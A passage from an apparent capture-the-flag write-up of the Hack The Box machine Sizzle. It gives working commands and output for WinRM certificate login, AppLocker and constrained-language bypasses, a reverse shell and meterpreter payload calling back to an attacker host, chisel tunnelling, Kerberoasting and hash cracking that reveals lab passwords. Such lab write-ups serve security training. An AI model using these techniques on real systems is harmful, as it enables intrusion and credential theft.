An optional company name []:

root@kali# ls amanda.*
amanda.csr  amanda.key

root@kali# cat amanda.csr 
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAKYhKIJDLTDDZGvddYQMJRBA9C5p5LY0Oi/ooi3Y
oHvUlYtczMD4Fw0hI9chrCo77TX/+22PIEek4YrW69HomTvGKNnRv/lsXvUlsO27
5nBGdlMDCuoDYY+3YfN+uEDARPLh/lLyBodkDoRjhvcUj6xPNAn29BjkoFdKIRcs
TqhKzgyadpSwkJBQMJ2F28zrTLrkCbapqUlrI0ACzAGhsy41etpmXCwfdQRCsH7U
4s/5fVNGa99XkVyn2NspPWOW9CvM9pcSQVGk25WCOnI4o8r46yx7XZe9kLBYNpkL
s/UKpJyuuCW/fNhdnBwJDdUbJCobt9rMMgr0o2D/mL6rqUsCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQA+lksZvE76XKeUuuGzz0LWuGY2JkkLM30jvEcqaQfWZSyr
3NYj9GtrjYkysc6vKuuvyxLTt53+cAZ1Og8CaHvJfR85AiiYuaLzm2Rez6FBlVIj
7Xsq+r3kMoUyNyn6Bra04OvbJPiKBGQvssI1Ac6yLpyELd7Q88NX++CgAN/+7exW
R3vZqGTNbjRqe3hlm04/ivydr07e8LVy5u80aWrO/eEZDZucfQc0kwbMvk61XoGK
O6Bjft5cVUiQaOOE6D9UG/ezJnaIYf5E0VStBIeowpOwHiWlfnRfAwNQAiynQry8
eu7w58I156Rd1c9lEoqjWMZplrJE4L05e4aGRO74
-----END CERTIFICATE REQUEST-----

```

Next, on the web page, I’ll go to “Request a certificate” just like the previous method, but then I’ll click on “advanced certificate request”.

I’ll paste the csr into the form, and hit “Submit >”:

![1548849095385](https://0xdfimages.gitlab.io/img/1548849095385.png)

The resulting page offers me links to download the certificate:

![1548849135260](https://0xdfimages.gitlab.io/img/1548849135260.png)

I’ll use the Download certificate link, and save it as `amanda.crt`.

### WinRM Shell

With certificate and key in hand, I can now authenticate as amanda using WinRM. I’ll use [Alamot’s Ruby script](https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb) with some small modification. In looking a the [Ruby WinRM module documentation](https://github.com/WinRb/WinRM#ssl), I’ll see that if the connection is over ssl, I have additional options, including `:client_cert`, `:client_key`, and `:key_pass`. I’ll use those, instead of the `user` and `password` fields. I’ll also set the endpoint, making sure to use the https connection on port 5986 (as opposed to http on 5985) since the keyed auth is only available on a secure connection:

```

require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'amanda.crt',
  client_key: 'amanda.key',
  key_pass: '0xdf',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end

```

Now I can run that and get a shell as amanda:

```

root@kali# ruby winrm_shell.rb
PS htb\amanda@SIZZLE Documents> whoami
htb\amanda

```

## CLM / AppLocker Break Out

### Enumeration

The shell I have is quite limited. I can see that I’m in constrained language mode, and that AppLocker is limiting what I can run.

```

PS htb\amanda@SIZZLE v2.0.50727> $executioncontext.sessionstate.languagemode
ConstrainedLanguage   

```

```

PS htb\amanda@SIZZLE Documents> Get-AppLockerPolicy -Effective -XML
<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule></RuleCollection><RuleCollection Type="Dll" EnforcementMode="NotConfigured" /><RuleCollection Type="Exe" EnforcementMode="Enabled"><FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions></FilePathRule><FilePathRule Id="d754b869-d2cc-46af-9c94-6b6e8c10d095" Name="All files located in the Program Files folder" Description="Allows members of the Everyone group to run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%OSDRIVE%\tmp\*" /></Conditions></FilePathRule><FilePathRule Id="fd686d83-a829-4351-8ff4-27c7de5755d2" Name="(Default Rule) All files" Description="Allows members of the local Administrators group to run all applications." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*" /></Conditions></FilePathRule></RuleCollection><RuleCollection Type="Msi" EnforcementMode="Enabled"><FilePublisherRule Id="b7af7102-efde-4369-8a89-7a6a392d1473" Name="(Default Rule) All digitally signed Windows Installer files" Description="Allows members of the Everyone group to run digitally signed Windows Installer files." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePathRule Id="5b290184-345a-4453-b184-45305f6d9a54" Name="(Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer" Description="Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\Windows\Installer." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\Installer\*" /></Conditions></FilePathRule><FilePathRule Id="64ad46ff-0d71-4fa0-a30b-3f3d30c5433d" Name="(Default Rule) All Windows Installer files" Description="Allows members of the local Administrators group to run all Windows Installer files." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*.*" /></Conditions></FilePathRule></RuleCollection><RuleCollection Type="Script" EnforcementMode="Enabled"><FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="(Default Rule) All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions></FilePathRule><FilePathRule Id="9428c672-5fc3-47f4-808a-a0011f36dd2c" Name="(Default Rule) All scripts located in the Windows folder" Description="Allows members of the Everyone group to run scripts that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions></FilePathRule><FilePathRule Id="ed97d0cb-15ff-430f-b82c-8d7832957725" Name="(Default Rule) All scripts" Description="Allows members of the local Administrators group to run all scripts." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*" /></Conditions></FilePathRule></RuleCollection></AppLockerPolicy>

```

### PSByPassCLM

[PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) is a good one for CLM breakout. I’ll build it in a Windows VM making sure to match the .NET version with what is on target (though I could probably also just use the exe in `PSBypassCLM/PSBypassCLM/bin/x64/Debug`), and upload the exe to the `\appdata\local\temp` directory for amanda.

Next I’ll run with the revshell option:

```

PS htb\amanda@SIZZLE Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe
Microsoft (R) .NET Framework Installation utility Version 4.6.1586.0
Copyright (C) Microsoft Corporation.  All rights reserved.

The uninstall is beginning.
See the contents of the log file for the C:\users\amanda\appdata\local\temp\a.exe assembly's progress.
The file is located at .
Uninstalling assembly 'C:\users\amanda\appdata\local\temp\a.exe'.
Affected parameters are:
   assemblypath = C:\users\amanda\appdata\local\temp\a.exe
   rport = 443
   revshell = true
   rhost = 10.10.14.4
   logtoconsole = true
   logfile = 
Trying to connect back...

```

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.103.
Ncat: Connection from 10.10.10.103:62228.
whoami
htb\amanda
PS C:\Users\amanda\Documents> $executioncontext.sessionstate.languagemode
FullLanguage

```

### msbuild

Alternatively, I could also use [msbuild as a bypass](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/). In this case, I’ll get a meterpreter session, since I’ll show it as one options for tunneling in the next step. As describe in the article linked above, I’ll create a payload with `msfvenom` in C# format:

```

root@kali# msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.14.4 lport=445 -e x86/shikata_ga_nai -i 20 -f csharp -o meterpreter_445.cs -v shellcode                                                                      
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai succeeded with size 638 (iteration=10)
x86/shikata_ga_nai succeeded with size 665 (iteration=11)
x86/shikata_ga_nai succeeded with size 692 (iteration=12)
x86/shikata_ga_nai succeeded with size 719 (iteration=13)
x86/shikata_ga_nai succeeded with size 746 (iteration=14)
x86/shikata_ga_nai succeeded with size 773 (iteration=15)
x86/shikata_ga_nai succeeded with size 800 (iteration=16)
x86/shikata_ga_nai succeeded with size 827 (iteration=17)
x86/shikata_ga_nai succeeded with size 854 (iteration=18)
x86/shikata_ga_nai succeeded with size 881 (iteration=19)
x86/shikata_ga_nai chosen with final size 881
Payload size: 881 bytes
Final size of csharp file: 4501 bytes
Saved as: meterpreter_445.cs

```

I’ll take the output of `msfvenom` add to [this xml](https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml), and name the file with a `.csproj` extension. I’ll upload it to Sizzle:

```

PS C:\users\amanda\appdata\local\temp> iwr -uri http://10.10.14.4/meterpreter.csproj -outfile a.csproj

```

Start a listener in Metasploit:

```

msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     445              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:445 

```

Run `msbuild` with the project:

```

PS C:\users\amanda\appdata\local\temp> c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe a.csproj

```

And get a session:

```

[*] Started reverse TCP handler on 10.10.14.4:445
[*] Sending stage (179779 bytes) to 10.10.10.103
[*] Meterpreter session 1 opened (10.10.14.4:445 -> 10.10.10.103:60542) at 2019-01-31 10:03:20 -0500

meterpreter > getuid
Server username: HTB\amanda

```

## Privesc: amanda –> mrlky

### Kerberoasting

#### Enumeration

I can see on the local box that port 88 is listening:

```

PS htb\amanda@SIZZLE Documents> netstat -ap tcp

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:21             sizzle:0               LISTENING
  TCP    0.0.0.0:80             sizzle:0               LISTENING
  TCP    0.0.0.0:88             sizzle:0               LISTENING
  TCP    0.0.0.0:135            sizzle:0               LISTENING
  TCP    0.0.0.0:389            sizzle:0               LISTENING
  TCP    0.0.0.0:443            sizzle:0               LISTENING
  TCP    0.0.0.0:445            sizzle:0               LISTENING
  TCP    0.0.0.0:464            sizzle:0               LISTENING
  TCP    0.0.0.0:593            sizzle:0               LISTENING
  TCP    0.0.0.0:636            sizzle:0               LISTENING
  TCP    0.0.0.0:3268           sizzle:0               LISTENING
  TCP    0.0.0.0:3269           sizzle:0               LISTENING
  TCP    0.0.0.0:5985           sizzle:0               LISTENING
  TCP    0.0.0.0:5986           sizzle:0               LISTENING
  TCP    0.0.0.0:9389           sizzle:0               LISTENING
  TCP    0.0.0.0:47001          sizzle:0               LISTENING
  TCP    0.0.0.0:49664          sizzle:0               LISTENING
  TCP    0.0.0.0:49665          sizzle:0               LISTENING
  TCP    0.0.0.0:49666          sizzle:0               LISTENING
  TCP    0.0.0.0:49668          sizzle:0               LISTENING
  TCP    0.0.0.0:49679          sizzle:0               LISTENING
  TCP    0.0.0.0:49680          sizzle:0               LISTENING
  TCP    0.0.0.0:49681          sizzle:0               LISTENING
  TCP    0.0.0.0:49682          sizzle:0               LISTENING
  TCP    0.0.0.0:49685          sizzle:0               LISTENING
  TCP    0.0.0.0:49694          sizzle:0               LISTENING
  TCP    0.0.0.0:55071          sizzle:0               LISTENING
  TCP    0.0.0.0:55082          sizzle:0               LISTENING
  TCP    10.10.10.103:53        sizzle:0               LISTENING
  TCP    10.10.10.103:139       sizzle:0               LISTENING
  TCP    10.10.10.103:5986      10.10.14.4:51558       ESTABLISHED
  TCP    127.0.0.1:53           sizzle:0               LISTENING

```

Since that didn’t show up in the original `nmap`, it must be firewalled off. But now that I have access to port 88 locally, I can Kerberoast. I cover the [background on Kerberoasting in the Active Writeup](/2018/12/08/htb-active.html#kerberoasting).

I’ll show four different ways to get access and Kerberoast. First I’ll show Rubeus, then I’ll show three different ways to port forward such that I can run `GetUserSPNs.py` from my local host.

#### Rubeus

[Rubeus](https://github.com/GhostPack/Rubeus) is a C# toolset for Kerberos interaction and abuse. I’ll clone the repo to my Windows box, and build a copy there. I’ll upload the resulting exe to `\windows\temp`, as that’s one place that AppLocker isn’t restricting (I can’t see what’s in the folder, so I’ll have to remember what I upload). Now I can run it:

```

PS C:\windows\temp> .\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.2.1

[*] Action: Kerberoasting

[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] Hash                   : $krb5tgs$23$*$HTB.LOCAL$http/sizzle*$D098430AE05C48336310FDBED548DE7E$6EB4E8F897
9E5178A8C870779F51B40ECDFA234350DE5C65B71774F336D7BB4D3605EF7F348EF5CBC9D4E23AB8
A2C0D312B5037E47C9EF5F11A8261B02A81E7992E86FFF6FEFC5E24677C09C223E7F2FB132D28D2B
4F3DDAEA4B9E0510E71D146337752FA916D51F84C7D6B85A7C61B96B8728DAA327802E6C2D8DC74A
A4F92F12AB79EA7776A61AAA7208DFEA2AB24E25B374176FA18E89FCAD1705D340023098D73A41BE
37F24593B76EE4EAE97398FF869BE05F0EFBBDE73E451DD381E906BEB0FF1993100255AF803B389B
1659F6929252AE022833D5BB80FA95F5F1011018E56684B53CD5230115087E7AB4AFCAEED0442135
0AFB0C5944B0914D764E820D785056D1281EDDA26385F67BDAEE6B67B5D1E34F667452327EF04098
BE3429BF8F6E935245D1AE2C447ED600733CF93E48B53004E4E4B08EC04AF2DEF6DE263658274B50
4A60D2D442B6226C4D88AD2C51AA3C9ECA00D6A38BD34BE08B39CEC60C3E1169D439D76B725FA6D8
80013251E3CCE6B631CA150FF7D2AB8951D22FCC2AC08A80F7B0B9391ED805FFCE7507A9249B1BD9
671482AC5A27BE5BF5FDC3B71355C1F78F165B17FD4A7C96392B075ACF42068E531B8F0042ED0F3F
760CB92E3F767213E3355BE30DDAD575B5C36BA57E4A425C30715FD763D151C42739DE1E3935CE05
15591F7D79BD9D4DC4F942B9BBD833C2636747AC48A5623D9845FAF874D7477A63D4182D59954A63
308511A10FD5940C57C14FC441898039375B2104BEDFC1E5DCA60B36F10582F48750BEE432A67481
5FC320B2D905F5585325565EAC1023BC17C0F67E46EC36449F7F9DB43734959101E90A89297F63D2
E432D53BEC6D20BC9FCFEB98C0E41D17DF2DF80DE28CA4D8450A6B28CEE66B7C39EE1A63FE2579FC
0D53FFF9803DCA2DD752506D3E01D39239357E7CCE0057FE8DF033D4B90538AF9D4249D81D100BF1
299BC37B7E09670576796B04039CBE5D13F042E7DACA692E5D9A2A89926E41A03EACE63A5B74F1A4
53D708FA158A4DDD282C340D73E1ECC788DF48533021A393C3105B5655E80224E9883A655C91C6EB
1C49AEC08A71A1D0D57A321119AF6A298F1353046C4E9B366DFE44FF1E5B893A376873983F9B9DF1
24426EC8A2F504334D418DF0DBA48D5B55AE312EB8C734763E8DCAAAF27C55824D826C6E288C7291
0A4CF8219A3C7037CDC8E00505E697B11FF5164C6861C467612787FFB5CE3AE1C525F7D7D2E346EB
0D2CBA9AB11BED38EAD91913212C15B5FB371615AE1763A3F9B4478C65CEA9420D7AD1C0F6911DAE
E574DB3E8193E475A43A63189288F2FB2DA6FDE4298CEC21F00BBED158CAC03F573D808F3B60AA96
80

```

#### Chisel Port Forward

I can run exes out of windows\temp… I can’t read in there, so need to track what i upload. I’ll grab the chisel binary from site: https://github.com/jpillora/chisel/releases. I’ll start the server on my host, and start a `python` http server so I can get `chisel` to target. Then I’ll run:

```

PS C:\windows\temp> iwr -uri http://10.10.14.4/chisel_windows_amd64.exe -outfile c.exe
PS C:\windows\temp> .\c.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389

```

The server sees:

```

root@kali# /opt/chisel/chisel server -p 8008 --reverse
2019/01/31 15:15:42 server: Reverse tunnelling enabled
2019/01/31 15:15:42 server: Fingerprint dd:1c:ff:0d:c8:c9:c5:3b:6a:06:e0:46:fb:05:e3:92
2019/01/31 15:15:42 server: Listening on 0.0.0.0:8008...
2019/01/31 15:18:55 server: session#1: Client version (1.3.1) differs from server version (0.0.0-src)
2019/01/31 15:18:55 server: proxy#1:R:0.0.0.0:88=>127.0.0.1:88: Listening
2019/01/31 15:18:55 server: proxy#2:R:0.0.0.0:389=>localhost:389: Listening

```

Now kerberoast:

```

root@kali# GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out                                                                                                                                             
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

Password:
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon
--------------------  -----  -----------------------------------------------------  -------------------  -------------------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2018-07-12 10:23:50

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

What? I’ll check the times:

```

PS htb\amanda@SIZZLE temp> date

Thursday, January 31, 2019 06:12:24 AM

```

```

root@kali# date
Thu Jan 31 06:20:45 EST 2019

```

For kerberos to work, times have to be within 5 minutes.

```

root@kali# date +%T -s "06:12:24"
06:12:24
root@kali# date
Thu Jan 31 06:12:27 EST 2019 

```

I’ll run again, and get the hash:

```

root@kali# GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

Password:
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon                                                                                                                                    
--------------------  -----  -----------------------------------------------------  -------------------  -------------------                                                                                                                          
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2019-01-31 11:28:40                                                                                                                          

$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1

```

#### Meterpreter Port Forward

From my meterpreter session I can set up a port forward for 389 and 88:

```

meterpreter > portfwd add -l 389 -p 389 -r 10.10.10.103
[*] Local TCP relay created: :389 <-> 10.10.10.103:389
meterpreter > portfwd add -l 88 -p 88 -r 10.10.10.103
[*] Local TCP relay created: :88 <-> 10.10.10.103:88

```

Then I can run `GetUserSPNs.py` as above.

#### Meterpreter socks

I could also use a proxy and `proxychains`:

```

msf auxiliary(gather/get_user_spns) > use auxiliary/server/socks4a
msf auxiliary(server/socks4a) > options

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy

msf auxiliary(server/socks4a) > run
[*] Auxiliary module running as background job 0.

[*] Starting the socks4a proxy server
msf auxiliary(server/socks4a) > route add 10.10.10.103 255.255.255.255 1

```

I’ll check `/etc/proxychains.conf`:

```

strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks4  127.0.0.1 1080

```

Now I can run the script, with `proxychains` in front:

```

root@kali# proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 htb.local/amanda
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.103:389-<><>-OK
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon
--------------------  -----  -----------------------------------------------------  -------------------  -------------------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2018-07-12 10:23:50

|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.103:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.103:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.103:88-<><>-OK
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$b571ee47fc7e8ce94ed6cf97061...[snip]...  

```

### Crack NetNTLMv2

Regardless of how I got it, the next step is to crack the hash. I’ll use `hashcat`:

```

$ hashcat -m 13100 -a 0 mrlky.ticket /usr/share/wordlists/rockyou.txt --force
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz, 8192/29068 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.
* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
- Device #1: autotuned kernel-accel to 32
- Device #1: autotuned kernel-loops to 1
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$4cc14f288e6087d7ebf2ab6750a0ac09$e8434ab472bf2203b18ff05437a50452fedef5ab2655023cbbc09834dd834d9076337d5050be3c3a3306351c05371aec98c15d93336c6cbefaf081061f71745874746215d8053ada5664e4f4d55d0b7ad161d8cca3c3585f0974d45a0e889da45a6f3658875f6ba91f5e7a26b0a664142fd48e4931f28e8f32dd90c776db6ccf994855a3d6f21b365bc40b24a42c5ad9fadb424852c8a3c8e3a73bb7e1ea549f0a971015f954d9b468df5359a00fbafceee9b5fab173106875eb6ebb851ebf6655f6d4567b9b3e91d5669ab42fffd82309606420ca08600ad1e1fdd99eba461b2d5d23851bf55d37b8ee75c3d371f7deb7e9de9e69953853df3e1023f1cdb88bc3ba44d8ecf1d7b54b841272b3c48a5a0ddd2918d2137bb2f2e09c8d1186fb29d2b2ef1504fbf836e252f98a23190b376bc7a637bf4b6c0595a7f7dba7f3eade2d13b160b91c134a884b52e6eec2732a274e91f892d5b1d33cb030d3f6371ad61bdd2cfcb64c4412eb4a04d53b4a3481e6f822fcb78467e8bec59ba7779793a7e66d0e8cbcc6ab115f311f7d1d4c9bf0a19e120da35ad5ce2f2475dae50227558af76245237b8806fd1ff82f5a107dae70167c43cec018d8caddcbb2b9da726758cc62c5e39c710b61a6e0d8c7050f86236d3293c107f1927d9ca24b3f26ad8b6d93fcb29f9b69614580f34e3b7e786f97b25709eff561c865d30c66318d7d9ff894003589cef4f7e4b40e209983737f5d0eefc53e99a19ba6ed360832b81cf87dc8e9c0cec2b710ac0b203f369543a978753a984c6cf2e14987e13772cdf96ab110514899f7251d076244e9aac1f0d84bf0813f806d5ea5ad9162d41fc3b7c600202407a418b23d7a51828e73b49e8f8e69b8720c40a1cb2cfd96bfa2554e8de8988030dc68e73ced5303ee47d2bf7b0cee71648bd18f0c32de7a16d42e5042b94ed0a0a1369b7de7d9f6886acd54a5beb60a2075d8461baf84f207f454839d144d318d23b1bbb35298e414af65330c0b36cf8d3502937b575982857b91caffe252d0aeebf55c920312ba03f03294f39db08418766f524f5b2d0b673228fde39805d759c15e128d31c4cc02c7baaeba93559a044b47cc501a4a873055f95b1b8f03008de3ee005bc344157b3c2e605c7a973d5aa90c899cb44a03df2738fc50e74b2f6e2b0c3a605e0f8114009c5a05ff2351a0c149fe76342909601f595a662af738d0f4a5c0fec6a2fc76098477301083dc832b076640:Football#7

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$4cc14f288...076640
Time.Started.....: Thu Jan 31 06:52:43 2019 (11 secs)
Time.Estimated...: Thu Jan 31 06:52:54 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1012.6 kH/s (8.05ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 11173888/14344385 (77.90%)
Rejected.........: 0/11173888 (0.00%)
Restore.Point....: 11157504/14344385 (77.78%)
Candidates.#1....: GAVINL -> Fake@smile
HWMon.Dev.#1.....: N/A

